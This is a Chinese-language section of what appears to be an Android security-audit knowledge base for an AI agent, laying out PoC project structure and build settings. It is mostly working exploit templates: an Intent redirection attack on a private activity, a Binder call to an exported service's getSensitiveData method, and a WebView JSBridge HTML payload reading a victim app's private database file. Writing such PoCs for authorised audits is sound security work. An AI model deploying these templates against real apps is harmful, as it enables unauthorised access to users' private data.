# 五、PoC 开发规范

> 来源：CkSKILLS v1 `android-security-audit` §五、PoC 开发规范（迁移至 v2 知识块）

### 5.1 项目结构

```text
poc_project/
├── app/
│   ├── build.gradle              # AGP 8.2.2+
│   └── src/main/
│       ├── aidl/                 # 从受害 App 提取的 AIDL 文件
│       ├── java/com/poc/exploit/ # 漏洞触发逻辑 (MainActivity.java)
│       └── AndroidManifest.xml
├── gradle/wrapper/               # Gradle 8.6+
├── build.gradle
└── settings.gradle
```

### 5.2 Java 21 兼容配置（Kali 等高版本环境）

```properties
distributionUrl=https\://services.gradle.org/distributions/gradle-8.6-bin.zip

android {
    compileSdk 34
    defaultConfig {
        minSdk 21
        targetSdk 34
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_21
        targetCompatibility JavaVersion.VERSION_21
    }
}
```

> 若 Gradle 未自动识别 SDK，在 `local.properties` 中手动指定：`sdk.dir=/path/to/android-sdk`；AGP 8.0+ 需在 `gradle.properties` 加 `android.useAndroidX=true`。

### 5.3 常见 PoC 模板

**Intent 重定向 PoC**

```java
// MainActivity.java
public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent malicious = new Intent();
        malicious.setComponent(new ComponentName(
            "com.victim",
            "com.victim.PrivateActivity"
        ));
        malicious.putExtra("sensitive_data", "stolen");

        Intent wrapper = new Intent();
        wrapper.setComponent(new ComponentName(
            "com.victim",
            "com.victim.ExportedActivity"
        ));
        wrapper.putExtra("redirect_intent", malicious);

        startActivity(wrapper);
    }
}
```

**Binder 服务调用 PoC**

```java
// 从受害 App 提取 AIDL 文件到 app/src/main/aidl/
public class MainActivity extends Activity {
    private ICustomService mService;

    private ServiceConnection mConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mService = ICustomService.Stub.asInterface(service);
            try {
                String result = mService.getSensitiveData();
                Log.d("PoC", "Result: " + result);
            } catch (RemoteException e) {
                e.printStackTrace();
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            mService = null;
        }
    };

    @Override
    protected void onStart() {
        super.onStart();
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
            "com.victim",
            "com.victim.ExportedService"
        ));
        bindService(intent, mConnection, BIND_AUTO_CREATE);
    }
}
```

**WebView JSBridge 注入 PoC**

```html
<!-- malicious.html -->
<script>
function exploit() {
    // 调用存在漏洞的 JSBridge 方法
    window.jsInterface.readFile("/data/data/com.victim/databases/private.db");
}

// 或通过自定义 scheme
location.href = "jsbridge://readFile?path=/data/data/com.victim/databases/private.db";
</script>
<button onclick="exploit()">Exploit</button>
```

---
